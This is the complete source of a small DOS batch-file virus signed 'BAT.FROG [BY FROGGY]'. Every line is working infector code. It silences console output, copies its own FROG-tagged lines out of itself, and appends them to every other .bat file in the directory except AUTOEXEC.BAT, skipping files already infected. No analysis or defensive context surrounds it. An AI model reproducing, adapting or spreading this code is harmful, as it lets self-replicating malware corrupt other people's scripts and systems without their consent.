@ctty nul%FROG%
if "%1=="FROG goto FROGz
echo.>FROG
find "FROG"<%0>>FROG
for %%b in (*.bat) do if not %%b==AUTOEXEC.BAT call %0 FROG %%b
del FROG
goto FROGe
:FROGz
find "FROG"<%2
if not errorlevel 1 goto FROGe
type FROG>>%2
:FROGe BAT.FROG [BY FROGGY]